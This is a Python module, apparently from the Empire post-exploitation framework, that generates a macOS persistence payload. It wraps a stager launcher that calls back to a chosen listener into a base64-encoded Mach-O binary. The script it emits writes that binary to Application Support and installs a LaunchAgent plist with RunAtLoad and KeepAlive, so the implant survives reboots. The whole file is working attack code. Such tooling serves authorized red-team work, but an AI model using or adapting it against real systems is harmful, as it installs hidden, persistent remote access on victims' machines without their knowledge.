import base64

from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ) -> tuple[str | None, str | None]:
        daemon_name = params["DaemonName"]
        program_name = daemon_name.split(".")[-1]
        plist_filename = f"{daemon_name}.plist"
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        safe_checks = params["SafeChecks"]
        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name,
            language="python",
            user_agent=user_agent,
            safe_checks=safe_checks,
        )
        launcher = launcher.removeprefix("echo ")
        launcher = launcher.removesuffix(" | python3 &")
        launcher = launcher.strip('"')

        macho_bytes = main_menu.stagergenv2.generate_macho(launcher_code=launcher)
        enc_bytes = base64.b64encode(macho_bytes)

        plistSettings = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""

        return f"""
import subprocess
import sys
import base64
import os

isRoot = True if os.geteuid() == 0 else False
user = os.environ['USER']
group = 'wheel' if isRoot else 'staff'

launchPath = '/Library/LaunchAgents/' if isRoot else '/Users/'+user+'/Library/LaunchAgents/'
daemonPath = '/Library/Application Support/{daemon_name}/' if isRoot else '/Users/'+user+'/Library/Application Support/{daemon_name}/'

encBytes = "{enc_bytes}"
bytes = base64.b64decode(encBytes)
plist = \"\"\"{plistSettings}
\"\"\" % ('{daemon_name}', daemonPath+'{program_name}')

if not os.path.exists(daemonPath):
    os.makedirs(daemonPath)

e = open(daemonPath+'{program_name}','wb')
e.write(bytes)
e.close()

os.chmod(daemonPath+'{program_name}', 0755)

f = open('/tmp/{plist_filename}','w')
f.write(plist)
f.close()

os.chmod('/tmp/{plist_filename}', 0644)

process = subprocess.Popen('chown '+user+':'+group+' /tmp/{plist_filename}', stdout=subprocess.PIPE, shell=True)
process.communicate()

process = subprocess.Popen('mv /tmp/{plist_filename} '+launchPath+'{plist_filename}', stdout=subprocess.PIPE, shell=True)
process.communicate()

print("\\n[+] Persistence has been installed: "+launchPath+"{plist_filename}")
print("\\n[+] Empire daemon has been written to "+daemonPath+"{program_name}")

"""
